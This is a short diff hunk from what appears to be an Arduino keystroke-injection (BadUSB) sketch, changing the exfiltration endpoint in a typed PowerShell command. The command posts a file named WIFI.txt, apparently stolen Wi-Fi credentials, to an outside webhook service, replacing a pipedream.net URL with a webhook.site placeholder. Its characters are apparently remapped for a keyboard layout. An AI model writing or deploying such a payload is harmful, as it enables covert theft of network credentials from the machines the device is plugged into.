@@ -46,7 +46,7 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(1000);
-  Keyboard.print(F("powershell Invoke/WebRequest /Uri https>&&eotrzqsgxfqspbn.m.pipedream.net /Method POST /InFile WIFI.txt"));
+  Keyboard.print(F("powershell Invoke/WebRequest /Uri https>&&webhook.site/url /Method POST /InFile WIFI.txt"));
 
   typeKey(KEY_RETURN);
 
